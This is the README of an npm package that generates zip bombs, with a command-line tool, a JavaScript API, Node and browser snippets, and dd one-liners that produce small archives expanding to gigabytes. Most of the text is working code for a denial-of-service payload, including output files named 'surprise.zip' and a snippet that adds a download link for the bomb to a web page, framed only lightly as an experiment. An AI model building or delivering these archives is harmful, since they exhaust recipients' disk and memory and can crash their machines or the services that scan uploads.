## 💣 Zip bomb [![standard][standard-image]][standard-url] [![travis][travis-image]][travis-url] [![npm][npm-image]][npm-url]

[standard-image]: https://img.shields.io/badge/code%20style-standard-brightgreen.svg
[standard-url]: http://standardjs.com/
[travis-image]: https://img.shields.io/travis/harshjv/zip-bomb/master.svg
[travis-url]: https://travis-ci.org/harshjv/zip-bomb
[npm-image]: https://img.shields.io/npm/v/zip-bomb.svg
[npm-url]: https://npmjs.org/package/zip-bomb

> **CAUTION** THIS IS JUST AN EXPERIMENT. USE THIS AT YOUR OWN RISK. READ MORE ABOUT ZIP BOMB [HERE](https://en.wikipedia.org/wiki/Zip_bomb).

[Zip bomb](https://en.wikipedia.org/wiki/Zip_bomb) for Browser and Node.js.

> [⚡️ Live demo here](https://rawgit.com/harshjv/zip-bomb/master/example/index.html)

## Installation

    npm install zip-bomb

Checkout [API](#api) usage.


## Command line

    npm install -g zip-bomb


### Usage

    Usage: zip-bomb [options]

    Options:

      -h, --help                       output usage information
      -V, --version                    output the version number
      -b, --zero-buffer-size <number>  Zero buffer size
      -l, --buffer-level <number>      Buffer multiplier
      -z, --zip-level <number>         Level
      -o, --output <file>              Output file

    Example:

        zip-bomb -b 10485760 -l 10 -z 50 -o surprise.zip


## API

### `zipBomb.createBuffer(zeroBufferSize, bufferLevel, zipLevel)`

Creates ZIP file `Buffer`.

> returns `Promise`

#### Parameters

* `zeroBufferSize`
  * can be `Number`
  * creates buffer of 0s with provided size
* `bufferLevel`
  * can be `Number`
  * multiplies created buffer with zeros with provided buffer level
* `zipLevel`
  * creates zip `zeroBufferSize * bufferLevel` zeros of provided zip level


### `zipBomb.createDataURL(zeroBufferSize, bufferLevel, zipLevel)`

Creates `DataURL` (for use in browsers)

> returns `Promise`

#### Parameters

Same as `zipBomb.createDataURL(bufferMultiplier, level)`


## Usage

### In Node.js

    const fs = require('fs')
    const zb = require('zip-bomb')

    const fileName = 'zipbomb.zip'

    zb.createBuffer(1024 * 1024 * 10, 10, 10)
      .then((buffer) => {
        fs.writeFile(fileName, buffer, (err) => {
          if (err) throw err

          console.log(`${fileName} is created`)
        })
      })

> **WARNING** `zipbomb.zip` file is evil!


### In Browser (with Browserify or webpack)

    const zb = require('zip-bomb')

    zb.createDataURL(1024 * 1024 * 10, 10, 10)
      .then((dataURL) => {
        const a = document.createElement('a')
        const linkText = document.createTextNode('Click here to download zip bomb')

        a.appendChild(linkText)
        a.href = dataURL
        document.body.appendChild(a)
      })
      .catch((e) => console.error(e))

> Embed bundled file into an HTML page and click on the link to download generated zip bomb!

Or open [/example/index.html](/example/index.html) folder in browser.

## Debug

### In Node.js

Enable debug logs by setting the `DEBUG` environment variable.

    DEBUG=zip-bomb*

### In Browser

Enable debug logs by running this in the developer console.

    localStorage.debug = 'zip-bomb*'

and then reload.


## The Linux Way

    dd if=/dev/zero bs=1000 count=20000000 | zip surprise.zip -

or

    dd if=/dev/zero bs=1000 count=20000000 | gzip > surprise.gz

Creates around `19 MB` file that extracts to around `20 GB` file. Keep increasing the count and enjoy!


## Test

    npm test

> `standard` only for now. More to come.


## License

MIT
